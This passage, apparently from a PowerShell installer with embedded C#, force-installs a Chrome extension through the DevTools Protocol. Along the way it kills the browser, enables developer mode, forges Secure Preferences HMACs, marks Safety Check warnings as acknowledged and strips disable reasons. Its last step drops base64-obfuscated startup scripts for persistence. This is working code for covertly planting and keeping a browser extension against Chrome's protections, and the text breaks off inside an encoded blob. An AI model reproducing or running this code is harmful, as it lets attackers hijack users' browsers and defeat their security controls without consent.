        sessionId = Extract(WaitForId(aId.ToString(), 25), "sessionId");
        return sessionId == null ? "ATTACH_FAIL|" : "";
    }
    static string RunEnableSteps(string sessionId, string extId) {
        string log = "";
        Thread.Sleep(5000);
        log += "DEVMODE:" + EvalInSession(sessionId, "(function(){try{const m=document.querySelector('extensions-manager');if(m&&m.delegate){m.delegate.setProfileInDevMode(true);return 'OK';}return 'NO_MGR';}catch(e){return 'ERR:'+e;}})()") + "|";
        Thread.Sleep(2000);
        log += "EVAL1:" + EvalInSession(sessionId, EnableJs(extId)) + "|";
        Thread.Sleep(10000);
        log += "EVAL2:" + EvalInSession(sessionId, EnableJs(extId)) + "|";
        string stJs = "(function(){const id='" + extId + "';try{if(chrome.management&&typeof chrome.management.get==='function'){return new Promise(ok=>chrome.management.get(id,i=>ok(JSON.stringify({enabled:i&&i.enabled,disabledReason:i&&i.disabledReason}))));}return 'NO_STATE';}catch(e){return 'ERR:'+e;}})()";
        log += "STATE:" + EvalInSession(sessionId, stJs) + "|";
        return log;
    }
    public static string RunInstall(string wsUrl, string extId, string extPath) {
        string log = "";
        try {
            _ws = new ClientWebSocket();
            _ws.ConnectAsync(new Uri(wsUrl), CancellationToken.None).Wait(15000);
            log += "CONNECT:ok|";
            string escPath = extPath.Replace("\\", "\\\\").Replace("\"", "\\\"");
            int lId = _id++;
            SendOnly("{\"id\":" + lId + ",\"method\":\"Extensions.loadUnpacked\",\"params\":{\"path\":\"" + escPath + "\"}}");
            string loadResp = WaitForId(lId.ToString(), 50);
            log += "EXT_CMD:" + (loadResp.Length > 160 ? loadResp.Substring(0, 160) : loadResp) + "|";
            string sessionId;
            string attachErr = AttachExtensionsPage(out sessionId);
            if (attachErr != "") return log + attachErr;
            int fcSet = _id++;
            SendOnly("{\"id\":" + fcSet + ",\"method\":\"Page.setInterceptFileChooserDialog\",\"sessionId\":\"" + sessionId + "\",\"params\":{\"enabled\":true}}");
            WaitForId(fcSet.ToString(), 15);
            log += "DEVMODE:" + EvalInSession(sessionId, "(function(){try{const m=document.querySelector('extensions-manager');if(m&&m.delegate){m.delegate.setProfileInDevMode(true);return 'OK';}return 'NO_MGR';}catch(e){return 'ERR:'+e;}})()") + "|";
            if (!loadResp.Contains("\"id\"")) {
                Thread.Sleep(2000);
                int luId = _id++;
                string luJs = "(async()=>{try{const m=document.querySelector('extensions-manager');if(!m||!m.delegate)return 'NO_MGR';return await m.delegate.loadUnpacked()?'DELEGATE_OK':'DELEGATE_CANCEL';}catch(e){return 'DELEGATE_ERR:'+e;}})()";
                luJs = luJs.Replace("\\", "\\\\").Replace("\"", "\\\"");
                SendOnly("{\"id\":" + luId + ",\"method\":\"Runtime.evaluate\",\"sessionId\":\"" + sessionId + "\",\"params\":{\"expression\":\"" + luJs + "\",\"awaitPromise\":true,\"returnByValue\":true}}");
                string fcEvt = WaitForEvent("Page.fileChooserOpened", 40);
                if (fcEvt != "") {
                    int hId = _id++;
                    string fcPath = extPath.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    SendOnly("{\"id\":" + hId + ",\"method\":\"Page.handleFileChooser\",\"sessionId\":\"" + sessionId + "\",\"params\":{\"action\":\"accept\",\"files\":[\"" + fcPath + "\"]}}");
                    string hResp = WaitForId(hId.ToString(), 30);
                    log += "FILECHOOSER:" + (hResp.Length > 80 ? hResp.Substring(0, 80) : hResp) + "|";
                    WaitForId(luId.ToString(), 40);
                } else {
                    log += "FILECHOOSER:timeout|";
                }
            }
            log += RunEnableSteps(sessionId, extId);
            int xId = _id++;
            SendOnly("{\"id\":" + xId + ",\"method\":\"Browser.close\"}");
            Thread.Sleep(3000);
            log += "CLOSE:ok|";
        } catch (Exception ex) { log += "ERR:" + ex.Message + "|"; }
        finally { try { if (_ws != null) _ws.Dispose(); } catch {} }
        return log;
    }
    public static string RunEnable(string wsUrl, string extId) {
        string log = "";
        try {
            _ws = new ClientWebSocket();
            _ws.ConnectAsync(new Uri(wsUrl), CancellationToken.None).Wait(15000);
            log += "CONNECT:ok|";
            string sessionId;
            string attachErr = AttachExtensionsPage(out sessionId);
            if (attachErr != "") return log + attachErr;
            log += RunEnableSteps(sessionId, extId);
            int xId = _id++;
            SendOnly("{\"id\":" + xId + ",\"method\":\"Browser.close\"}");
            Thread.Sleep(3000);
            log += "CLOSE:ok|";
        } catch (Exception ex) { log += "ERR:" + ex.Message + "|"; }
        finally { try { if (_ws != null) _ws.Dispose(); } catch {} }
        return log;
    }
}
'@ -ErrorAction SilentlyContinue
    $script:cdpTypeLoaded = $true
}

function Start-CdpChrome([string]$ChromeExe, [string]$UserDataDir) {
    Ensure-CdpType
    $out = ""
    Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep 2
    $parent = Split-Path $UserDataDir -Parent
    $junction = Join-Path $parent 'User Data_dbg'
    if (Test-Path $junction) { cmd /c "rmdir `"$junction`"" 2>$null }
    $mk = cmd /c "mklink /J `"$junction`" `"$UserDataDir`"" 2>&1
    if ($LASTEXITCODE -ne 0) { return @{ Ok = $false; Log = "JUNCTION_FAIL|$mk|" } }
    $out += "JUNCTION:ok|"
    $port = 19222 + (Get-Random -Maximum 800)
    $proc = Start-Process $ChromeExe -ArgumentList @(
        "--remote-debugging-port=$port",
        "--enable-unsafe-extension-debugging",
        "--user-data-dir=`"$junction`"",
        "--no-first-run", "--no-default-browser-check", "--disable-background-networking"
    ) -PassThru
    $out += "PID:$($proc.Id)|PORT:$port|"
    $wsUrl = $null
    for ($i = 0; $i -lt 30; $i++) {
        try {
            $ver = (Invoke-WebRequest -Uri "http://127.0.0.1:$port/json/version" -UseBasicParsing -TimeoutSec 2).Content
            if ($ver -match '"webSocketDebuggerUrl"\s*:\s*"([^"]+)"') { $wsUrl = $Matches[1]; break }
        } catch { Start-Sleep 1 }
    }
    if (-not $wsUrl) {
        if (-not $proc.HasExited) { $proc | Stop-Process -Force }
        cmd /c "rmdir `"$junction`"" 2>$null
        return @{ Ok = $false; Log = $out + "PORT_TIMEOUT|" }
    }
    return @{ Ok = $true; Log = $out + "WS:ok|"; WsUrl = $wsUrl; Proc = $proc; Junction = $junction }
}

function Stop-CdpChrome($session) {
    if ($session.Proc -and -not $session.Proc.HasExited) { $session.Proc | Stop-Process -Force }
    Start-Sleep 2
    if ($session.Junction) { cmd /c "rmdir `"$($session.Junction)`"" 2>$null }
}

function Invoke-CdpInstallExtension([string]$ChromeExe, [string]$Id, [string]$UserDataDir, [string]$ExtPath) {
    $session = Start-CdpChrome $ChromeExe $UserDataDir
    if (-not $session.Ok) { return $session.Log }
    $log = $session.Log + [CdpWs]::RunInstall($session.WsUrl, $Id, $ExtPath)
    Stop-CdpChrome $session
    return $log
}

function Invoke-CdpEnableExtension([string]$ChromeExe, [string]$Id, [string]$UserDataDir) {
    $session = Start-CdpChrome $ChromeExe $UserDataDir
    if (-not $session.Ok) { return $session.Log }
    $log = $session.Log + [CdpWs]::RunEnable($session.WsUrl, $Id)
    Stop-CdpChrome $session
    return $log
}

# --- STEP 8: Install via CDP loadUnpacked (unpacked path, not external registry) ---
Log "STEP 8: Installing via CDP loadUnpacked..."
# External registry install = force-installed off-store = permanently blocked (disable_reasons 256)
cmd /c "reg delete `"HKCU\Software\Google\Chrome\Extensions\$extId`" /f" >nul 2>&1
$policyOk = Set-ChromePoliciesReg $extId $localUpdateUrl

$cdpInstallOut = Invoke-CdpInstallExtension $chromeExe $extId $userDataDir $extSrcDir
Log "  CDP install: $cdpInstallOut"

$content = if (Test-Path $secPrefsPath) { Get-Content $secPrefsPath -Raw } else { "" }
Log "  Extension in SecPrefs: $($content.Contains($extId))"
$dr = Get-ExtDisableReasons $content $extId
if ($dr -ne "" -and $dr -ne $null) { Log "  After install disable_reasons: [$dr]" }

# --- STEP 9: Phase 2 (only if policies writable) or HMAC enable ---
Log "STEP 9: Enable extension..."
Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep 3

$verifiedCreds = Get-VerifiedChromeSeed $chromeDir $secPrefsPath
$hmacOk = $false

if ($policyOk) {
    Log "  Policies OK - trying CWS URL phase..."
    Set-ChromePoliciesReg $extId $cwsUpdateUrl | Out-Null
    Start-Process $chromeExe
    Start-Sleep 12
    Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep 2
    if (Test-ExtensionEnabled $secPrefsPath $extId) {
        Log "  Phase 2: ENABLED via policy"
        $hmacOk = $true
    } else {
        $dr = Get-ExtDisableReasons (Get-Content $secPrefsPath -Raw) $extId
        Log "  Phase 2 still disabled [$dr] - using HMAC"
        $hmacOk = Enable-ExtensionSecPrefs $secPrefsPath $extId $chromeDir $persistDir $verifiedCreds
    }
} else {
    Log "  Policies LOCKED - using HMAC"
    $hmacOk = Enable-ExtensionSecPrefs $secPrefsPath $extId $chromeDir $persistDir $verifiedCreds
}

# Runtime test: Chrome may re-apply disable_reasons even when HMAC is valid
Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep 2
Start-Process $chromeExe
Start-Sleep 12
Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep 3

$runtimeOk = Test-ExtensionEnabled $secPrefsPath $extId
$content = Get-Content $secPrefsPath -Raw
$dr = Get-ExtDisableReasons $content $extId
$state = Get-ExtState $content $extId
Log "  After HMAC runtime test: state=$state disable_reasons=[$dr] enabled=$runtimeOk"

if (-not $runtimeOk) {
    Log "  STEP 9b: CDP enable (Safety Check override)..."
    $cdpOut = Invoke-CdpEnableExtension $chromeExe $extId $userDataDir
    Log "  CDP: $cdpOut"
    Start-Sleep 3
    Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep 2
    Start-Process $chromeExe
    Start-Sleep 12
    Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep 3
    $runtimeOk = Test-ExtensionEnabled $secPrefsPath $extId
    $content = Get-Content $secPrefsPath -Raw
    $dr = Get-ExtDisableReasons $content $extId
    $state = Get-ExtState $content $extId
    if ($runtimeOk) { Log "  CDP enable: SUCCESS" } else { Log "  CDP enable: still disabled (state=$state dr=[$dr])" }
}

$macStillOk = $false
if ($verifiedCreds) {
    [ExtEnable]::Init($verifiedCreds.Seed, $verifiedCreds.DeviceId, $verifiedCreds.UseStrip) | Out-Null
    $macStillOk = [bool][ExtEnable]::VerifyCurrent($content)
}
Log "  Post-enable: state=$state disable_reasons=[$dr] mac_valid=$macStillOk enabled=$runtimeOk"
if ($runtimeOk) {
    Log "  Final state: ENABLED"
} else {
    Log "  Final state: DISABLED"
}

# --- STEP 10: Write enable helper + startup refresher ---
Log "STEP 10: Installing startup refresher..."

$enablePath = Join-Path $persistDir "enable.ps1"
[IO.File]::WriteAllBytes($enablePath, [Convert]::FromBase64String('cGFyYW0oW3N0cmluZ10kRXh0SWQsIFtzdHJpbmddJENocm9tZURpciwgW3N0cmluZ10kU2VjUHJlZnNQYXRoKQ0KJGJhc2VEaXIgPSAkUFNTY3JpcHRSb290DQokc2VlZEhleCA9IChHZXQtQ29udGVudCAoSm9pbi1QYXRoICRiYXNlRGlyICdzZWVkLmhleCcpIC1SYXcgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpDQokZGV2aWNlSWQgPSAoR2V0LUNvbnRlbnQgKEpvaW4tUGF0aCAkYmFzZURpciAnZGV2aWNlX2lkLnR4dCcpIC1SYXcgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpDQokY2Fub25Nb2RlID0gKEdldC1Db250ZW50IChKb2luLVBhdGggJGJhc2VEaXIgJ2Nhbm9uX21vZGUudHh0JykgLVJhdyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkNCmlmICgtbm90ICRzZWVkSGV4IC1vciAtbm90ICRkZXZpY2VJZCkgeyBleGl0IDEgfQ0KJHNlZWRIZXggPSAkc2VlZEhleC5UcmltKCkNCiRkZXZpY2VJZCA9ICRkZXZpY2VJZC5UcmltKCkNCiR1c2VTdHJpcCA9ICgkY2Fub25Nb2RlLlRyaW0oKSAtZXEgJ3N0cmlwJykNCiRzZWVkID0gTmV3LU9iamVjdCBieXRlW10gNjQNCmZvciAoJGkgPSAwOyAkaSAtbHQgNjQ7ICRpKyspIHsgJHNlZWRbJGldID0gW0NvbnZlcnRdOjpUb0J5dGUoJHNlZWRIZXguU3Vic3RyaW5nKCRpKjIsMiksMTYpIH0NCg0KJGFzbURpciA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5SdW50aW1lRW52aXJvbm1lbnRdOjpHZXRSdW50aW1lRGlyZWN0b3J5KCkNCkFkZC1UeXBlIC1SZWZlcmVuY2VkQXNzZW1ibGllcyBAKCIkYXNtRGlyXFN5c3RlbS5XZWIuRXh0ZW5zaW9ucy5kbGwiKSAtVHlwZURlZmluaXRpb24gQCcNCnVzaW5nIFN5c3RlbTsgdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zOyB1c2luZyBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYzsgdXNpbmcgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeTsgdXNpbmcgU3lzdGVtLlRleHQ7DQp1c2luZyBTeXN0ZW0uV2ViLlNjcmlwdC5TZXJpYWxpemF0aW9uOw0KcHVibGljIGNsYXNzIEV4dEVuYWJsZSB7DQogICAgc3RhdGljIGJ5dGVbXSBzZWVkOyBzdGF0aWMgc3RyaW5nIGRldmljZUlkOyBzdGF0aWMgYm9vbCB1c2VTdHJpcDsNCiAgICBzdGF0aWMgSmF2YVNjcmlwdFNlcmlhbGl6ZXIganNzID0gbmV3IEphdmFTY3JpcHRTZXJpYWxpemVyIHsgTWF4SnNvbkxlbmd0aCA9IGludC5NYXhWYWx1ZSB9Ow0KICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBJbml0KGJ5dGVbXSBzLCBzdHJpbmcgZCwgYm9vbCBzdHJpcCkgeyBzZWVkID0gczsgZGV2aWNlSWQgPSBkOyB1c2VTdHJpcCA9IHN0cmlwOyB9DQogICAgc3RhdGljIHN0cmluZyBIbWFjKHN0cmluZyBtc2cpIHsgdXNpbmcgKHZhciBoID0gbmV3IEhNQUNTSEEyNTYoc2VlZCkpIHJldHVybiBCaXRDb252ZXJ0ZXIuVG9TdHJpbmcoaC5Db21wdXRlSGFzaChFbmNvZGluZy5VVEY4LkdldEJ5dGVzKG1zZykpKS5SZXBsYWNlKCItIiwiIik7IH0NCiAgICBzdGF0aWMgc3RyaW5nIEVzYyhzdHJpbmcgcykgeyB2YXIgc2IgPSBuZXcgU3RyaW5nQnVpbGRlcigpOyBzYi5BcHBlbmQoJyInKTsgZm9yZWFjaCAoY2hhciBjIGluIHMpIHsgc3dpdGNoIChjKSB7IGNhc2UgJyInOiBzYi5BcHBlbmQoIlxcXCIiKTsgYnJlYWs7IGNhc2UgJ1xcJzogc2IuQXBwZW5kKCJcXFxcIik7IGJyZWFrOyBjYXNlICdcbic6IHNiLkFwcGVuZCgiXFxuIik7IGJyZWFrOyBjYXNlICdccic6IHNiLkFwcGVuZCgiXFxyIik7IGJyZWFrOyBjYXNlICdcdCc6IHNiLkFwcGVuZCgiXFx0Iik7IGJyZWFrOyBjYXNlICc8Jzogc2IuQXBwZW5kKCJcXHUwMDNDIik7IGJyZWFrOyBkZWZhdWx0OiBzYi5BcHBlbmQoYyk7IGJyZWFrOyB9IH0gc2IuQXBwZW5kKCciJyk7IHJldHVybiBzYi5Ub1N0cmluZygpOyB9DQogICAgc3RhdGljIHN0cmluZyBUb0Nhbm9uRnVsbChvYmplY3Qgb2JqKSB7DQogICAgICAgIGlmIChvYmogPT0gbnVsbCkgcmV0dXJuICJudWxsIjsgaWYgKG9iaiBpcyBib29sKSByZXR1cm4gKGJvb2wpb2JqID8gInRydWUiIDogImZhbHNlIjsgaWYgKG9iaiBpcyBpbnQpIHJldHVybiAoKGludClvYmopLlRvU3RyaW5nKCk7IGlmIChvYmogaXMgbG9uZykgcmV0dXJuICgobG9uZylvYmopLlRvU3RyaW5nKCk7DQogICAgICAgIGlmIChvYmogaXMgc3RyaW5nKSByZXR1cm4gRXNjKChzdHJpbmcpb2JqKTsNCiAgICAgICAgaWYgKG9iaiBpcyBBcnJheUxpc3QpIHsgdmFyIGE9KEFycmF5TGlzdClvYmo7IHZhciBwYXJ0cz1uZXcgc3RyaW5nW2EuQ291bnRdOyBmb3IoaW50IGk9MDtpPGEuQ291bnQ7aSsrKSBwYXJ0c1tpXT1Ub0Nhbm9uRnVsbChhW2ldKTsgcmV0dXJuICJbIitzdHJpbmcuSm9pbigiLCIscGFydHMpKyJdIjsgfQ0KICAgICAgICBpZiAob2JqIGlzIERpY3Rpb25hcnk8c3RyaW5nLG9iamVjdD4pIHsgdmFyIGQ9KERpY3Rpb25hcnk8c3RyaW5nLG9iamVjdD4pb2JqOyB2YXIga2V5cz1uZXcgTGlzdDxzdHJpbmc+KGQuS2V5cyk7IGtleXMuU29ydChTdHJpbmdDb21wYXJlci5PcmRpbmFsKTsgdmFyIHBhcnRzPW5ldyBMaXN0PHN0cmluZz4oKTsgZm9yZWFjaCh2YXIgayBpbiBrZXlzKSBwYXJ0cy5BZGQoRXNjKGspKyI6IitUb0Nhbm9uRnVsbChkW2tdKSk7IHJldHVybiAieyIrc3RyaW5nLkpvaW4oIiwiLHBhcnRzKSsifSI7IH0NCiAgICAgICAgcmV0dXJuIEVzYyhvYmouVG9TdHJpbmcoKSk7DQogICAgfQ0KICAgIHN0YXRpYyBzdHJpbmcgVG9DYW5vblN0cmlwKG9iamVjdCBvYmopIHsNCiAgICAgICAgaWYgKG9iaiA9PSBudWxsKSByZXR1cm4gIm51bGwiOyBpZiAob2JqIGlzIGJvb2wpIHJldHVybiAoYm9vbClvYmogPyAidHJ1ZSIgOiAiZmFsc2UiOyBpZiAob2JqIGlzIGludCkgcmV0dXJuICgoaW50KW9iaikuVG9TdHJpbmcoKTsgaWYgKG9iaiBpcyBsb25nKSByZXR1cm4gKChsb25nKW9iaikuVG9TdHJpbmcoKTsNCiAgICAgICAgaWYgKG9iaiBpcyBzdHJpbmcpIHJldHVybiBFc2MoKHN0cmluZylvYmopOw0KICAgICAgICBpZiAob2JqIGlzIEFycmF5TGlzdCkgeyB2YXIgYT0oQXJyYXlMaXN0KW9iajsgaWYoYS5Db3VudD09MCkgcmV0dXJuIG51bGw7IHZhciBwYXJ0cz1uZXcgTGlzdDxzdHJpbmc+KCk7IGZvcihpbnQgaT0wO2k8YS5Db3VudDtpKyspe3N0cmluZyBwPVRvQ2Fub25TdHJpcChhW2ldKTsgaWYocCE9bnVsbCkgcGFydHMuQWRkKHApO30gcmV0dXJuIHBhcnRzLkNvdW50PT0wP251bGw6IlsiK3N0cmluZy5Kb2luKCIsIixwYXJ0cykrIl0iOyB9DQogICAgICAgIGlmIChvYmogaXMgRGljdGlvbmFyeTxzdHJpbmcsb2JqZWN0PikgeyB2YXIgZD0oRGljdGlvbmFyeTxzdHJpbmcsb2JqZWN0PilvYmo7IHZhciBrZXlzPW5ldyBMaXN0PHN0cmluZz4oZC5LZXlzKTsga2V5cy5Tb3J0KFN0cmluZ0NvbXBhcmVyLk9yZGluYWwpOyB2YXIgcGFydHM9bmV3IExpc3Q8c3RyaW5nPigpOyBmb3JlYWNoKHZhciBrIGluIGtleXMpe3N0cmluZyB2PVRvQ2Fub25TdHJpcChkW2tdKTsgaWYodiE9bnVsbCkgcGFydHMuQWRkKEVzYyhrKSsiOiIrdik7fSByZXR1cm4gcGFydHMuQ291bnQ9PTA/bnVsbDoieyIrc3RyaW5nLkpvaW4oIiwiLHBhcnRzKSsifSI7IH0NCiAgICAgICAgcmV0dXJuIEVzYyhvYmouVG9TdHJpbmcoKSk7DQogICAgfQ0KICAgIHN0YXRpYyBzdHJpbmcgQ2Fub24ob2JqZWN0IG9iaikgeyByZXR1cm4gdXNlU3RyaXAgPyBUb0Nhbm9uU3RyaXAob2JqKSA6IFRvQ2Fub25GdWxsKG9iaik7IH0NCiAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBQYXRjaChzdHJpbmcgY29udGVudCwgc3RyaW5nIGV4dElkKSB7DQogICAgICAgIGludCBleHRTdGFydCA9IGNvbnRlbnQuSW5kZXhPZigiXCIiK2V4dElkKyJcIjp7Iik7IGlmIChleHRTdGFydDwwKSByZXR1cm4gbnVsbDsNCiAgICAgICAgaW50IGJsb2NrRW5kPWV4dFN0YXJ0LCBkZXB0aD0wOw0KICAgICAgICBmb3IgKGludCBpPWV4dFN0YXJ0K2V4dElkLkxlbmd0aCsyO2k8Y29udGVudC5MZW5ndGg7aSsrKSB7IGlmKGNvbnRlbnRbaV09PSd7JylkZXB0aCsrOyBlbHNlIGlmKGNvbnRlbnRbaV09PSd9Jyl7ZGVwdGgtLTtpZihkZXB0aD09MCl7YmxvY2tFbmQ9aTticmVhazt9fSB9DQogICAgICAgIHN0cmluZyBibG9jaz1jb250ZW50LlN1YnN0cmluZyhleHRTdGFydCxibG9ja0VuZC1leHRTdGFydCsxKTsNCiAgICAgICAgc3RyaW5nIHBhdGNoZWQ9U3lzdGVtLlRleHQuUmVndWxhckV4cHJlc3Npb25zLlJlZ2V4LlJlcGxhY2UoYmxvY2ssIiw/XCJkaXNhYmxlX3JlYXNvbnNcIjpcXFtbXlxcXV0qXFxdIiwiIik7DQogICAgICAgIGlmKCFwYXRjaGVkLkNvbnRhaW5zKCJcInN0YXRlXCI6IikpIHBhdGNoZWQ9cGF0Y2hlZC5SZXBsYWNlKCJcIiIrZXh0SWQrIlwiOnsiLCJcIiIrZXh0SWQrIlwiOntcInN0YXRlXCI6MSwiKTsNCiAgICAgICAgZWxzZSBwYXRjaGVkPVN5c3RlbS5UZXh0LlJlZ3VsYXJFeHByZXNzaW9ucy5SZWdleC5SZXBsYWNlKHBhdGNoZWQsIlwic3RhdGVcIjpcXGQrIiwiXCJzdGF0ZVwiOjEiKTsNCiAgICAgICAgaWYoIXBhdGNoZWQuQ29udGFpbnMoIlwiYWNrX3NhZmV0eV9jaGVja193YXJuaW5nXCI6IikpIHBhdGNoZWQ9cGF0Y2hlZC5SZXBsYWNlKCJcIiIrZXh0SWQrIlwiOnsiLCJcIiIrZXh0SWQrIlwiOntcImFja19zYWZldHlfY2hlY2tfd2FybmluZ1wiOnRydWUsIik7DQogICAgICAgIGVsc2UgcGF0Y2hlZD1TeXN0ZW0uVGV4dC5SZWd1bGFyRXhwcmVzc2lvbnMuUmVnZXguUmVwbGFjZShwYXRjaGVkLCJcImFja19zYWZldHlfY2hlY2tfd2FybmluZ1wiOih0cnVlfGZhbHNlKSIsIlwiYWNrX3NhZmV0eV9jaGVja193YXJuaW5nXCI6dHJ1ZSIpOw0KICAgICAgICBjb250ZW50PWNvbnRlbnQuU3Vic3RyaW5nKDAsZXh0U3RhcnQpK3BhdGNoZWQrY29udGVudC5TdWJzdHJpbmcoYmxvY2tFbmQrMSk7DQogICAgICAgIHZhciByb290PWpzcy5EZXNlcmlhbGl6ZTxEaWN0aW9uYXJ5PHN0cmluZyxvYmplY3Q+Pihjb250ZW50KTsNCiAgICAgICAgdmFyIHByb3RlY3Rpb249KERpY3Rpb25hcnk8c3RyaW5nLG9iamVjdD4pcm9vdFsicHJvdGVjdGlvbiJdOyB2YXIgbWFjcz0oRGljdGlvbmFyeTxzdHJpbmcsb2JqZWN0Pilwcm90ZWN0aW9uWyJtYWNzIl07DQogICAgICAgIHZhciBleHRNYWNzPShEaWN0aW9uYXJ5PHN0cmluZyxvYmplY3Q+KW1hY3NbImV4dGVuc2lvbnMiXTsgdmFyIHNldHRpbmdzTWFjcz0oRGljdGlvbmFyeTxzdHJpbmcsb2JqZWN0PilleHRNYWNzWyJzZXR0aW5ncyJdOw0KICAgICAgICB2YXIgZXh0ZW5zaW9ucz0oRGljdGlvbmFyeTxzdHJpbmcsb2JqZWN0PikoKERpY3Rpb25hcnk8c3RyaW5nLG9iamVjdD4pcm9vdFsiZXh0ZW5zaW9ucyJdKVsic2V0dGluZ3MiXTsNCiAgICAgICAgdmFyIGV4dFNldHRpbmdzPShEaWN0aW9uYXJ5PHN0cmluZyxvYmplY3Q+KWV4dGVuc2lvbnNbZXh0SWRdOw0KICAgICAgICBzdHJpbmcgY2Fub25pY2FsPUNhbm9uKGV4dFNldHRpbmdzKTsgc3RyaW5nIG1hY1BhdGg9ImV4dGVuc2lvbnMuc2V0dGluZ3MuIitleHRJZDsgc3RyaW5nIG5ld01hYz1IbWFjKGRldmljZUlkK21hY1BhdGgrY2Fub25pY2FsKTsNCiAgICAgICAgc2V0dGluZ3NNYWNzW2V4dElkXT1uZXdNYWM7IHN0cmluZyBtYWNzQ2Fub25pY2FsPUNhbm9uKG1hY3MpOyBzdHJpbmcgbmV3U3VwZXI9SG1hYyhkZXZpY2VJZCttYWNzQ2Fub25pY2FsKTsNCiAgICAgICAgc3RyaW5nIG9sZE1hY0tleT0iXCIiK2V4dElkKyJcIjpcIiI7IGludCBtYWNzU3RhcnQ9Y29udGVudC5JbmRleE9mKCJcIm1hY3NcIjp7Iik7IGludCBtYWNQb3M9Y29udGVudC5JbmRleE9mKG9sZE1hY0tleSxtYWNzU3RhcnQpOw0KICAgICAgICBpZihtYWNQb3M+MCl7aW50IHZhbFN0YXJ0PW1hY1BvcytvbGRNYWNLZXkuTGVuZ3RoO2ludCB2YWxFbmQ9Y29udGVudC5JbmRleE9mKCJcIiIsdmFsU3RhcnQpO2NvbnRlbnQ9Y29udGVudC5SZW1vdmUodmFsU3RhcnQsdmFsRW5kLXZhbFN0YXJ0KS5JbnNlcnQodmFsU3RhcnQsbmV3TWFjKTt9DQogICAgICAgIHN0cmluZyBzbUtleT0iXCJzdXBlcl9tYWNcIjpcIiI7IGludCBzbVBvcz1jb250ZW50LkluZGV4T2Yoc21LZXkpOw0KICAgICAgICBpZihzbVBvcz49MCl7aW50IHNtVmFsU3RhcnQ9c21Qb3Mrc21LZXkuTGVuZ3RoO2ludCBzbVZhbEVuZD1jb250ZW50LkluZGV4T2YoIlwiIixzbVZhbFN0YXJ0KTtjb250ZW50PWNvbnRlbnQuUmVtb3ZlKHNtVmFsU3RhcnQsc21WYWxFbmQtc21WYWxTdGFydCkuSW5zZXJ0KHNtVmFsU3RhcnQsbmV3U3VwZXIpO30NCiAgICAgICAgcmV0dXJuIGNvbnRlbnQ7DQogICAgfQ0KfQ0KJ0AgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCg0KW0V4dEVuYWJsZV06OkluaXQoJHNlZWQsICRkZXZpY2VJZCwgJHVzZVN0cmlwKQ0KJGMgPSBbSU8uRmlsZV06OlJlYWRBbGxUZXh0KCRTZWNQcmVmc1BhdGgsIFtUZXh0LkVuY29kaW5nXTo6VVRGOCkNCiRwID0gW0V4dEVuYWJsZV06OlBhdGNoKCRjLCAkRXh0SWQpDQppZiAoJHApIHsgW0lPLkZpbGVdOjpXcml0ZUFsbFRleHQoJFNlY1ByZWZzUGF0aCwgJHAsIChOZXctT2JqZWN0IFRleHQuVVRGOEVuY29kaW5nKCRmYWxzZSkpKSB9DQo='))
$cdpEnablePath = Join-Path $persistDir "cdp_enable.ps1"
[IO.File]::WriteAllBytes($cdpEnablePath, [Convert]::FromBase64String('cGFyYW0oW3N0cmluZ10kQ2hyb21lRXhlLCBbc3RyaW5nXSRFeHRJZCwgW3N0cmluZ10kVXNlckRhdGFEaXIsIFtzdHJpbmddJEV4dFBhdGggPSAiIikNCiRFcnJvckFjdGlvblByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250aW51ZScNCiRsb2cgPSAiIg0KDQpmdW5jdGlvbiBXTG9nKFtzdHJpbmddJHMpIHsgJHNjcmlwdDpsb2cgKz0gJHMgfQ0KDQpHZXQtUHJvY2VzcyBjaHJvbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBTdG9wLVByb2Nlc3MgLUZvcmNlDQpTdGFydC1TbGVlcCAyDQoNCiRwYXJlbnQgPSBTcGxpdC1QYXRoICRVc2VyRGF0YURpciAtUGFyZW50DQokanVuY3Rpb24gPSBKb2luLVBhdGggJHBhcmVudCAnVXNlciBEYXRhX2RiZycNCmlmIChUZXN0LVBhdGggJGp1bmN0aW9uKSB7IGNtZCAvYyAicm1kaXIgYCIkanVuY3Rpb25gIiIgMj4kbnVsbCB9DQokbWsgPSBjbWQgL2MgIm1rbGluayAvSiBgIiRqdW5jdGlvbmAiIGAiJFVzZXJEYXRhRGlyYCIiIDI+JjENCmlmICgkTEFTVEVYSVRDT0RFIC1uZSAwKSB7IFdMb2cgIkpVTkNUSU9OX0ZBSUx8JG1rfCI7IFdyaXRlLU91dHB1dCAkbG9nOyBleGl0IDEgfQ0KV0xvZyAiSlVOQ1RJT046b2t8Ig0KDQokcG9ydCA9IDE5MjIyICsgKEdldC1SYW5kb20gLU1heGltdW0gODAwKQ0KJGFyZ3MgPSBAKA0KICAgICItLXJlbW90ZS1kZWJ1Z2dpbmctcG9ydD0kcG9ydCIsDQogICAgIi0tZW5hYmxlLXVuc2FmZS1leHRlbnNpb24tZGVidWdnaW5nIiwNCiAgICAiLS11c2VyLWRhdGEtZGlyPWAiJGp1bmN0aW9uYCIiLA0KICAgICItLW5vLWZpcnN0LXJ1biIsDQogICAgIi0tbm8tZGVmYXVsdC1icm93c2VyLWNoZWNrIiwNCiAgICAiLS1kaXNhYmxlLWJhY2tncm91bmQtbmV0d29ya2luZyINCikNCiRwcm9jID0gU3RhcnQtUHJvY2VzcyAkQ2hyb21lRXhlIC1Bcmd1bWVudExpc3QgJGFyZ3MgLVBhc3NUaHJ1DQpXTG9nICJQSUQ6JCgkcHJ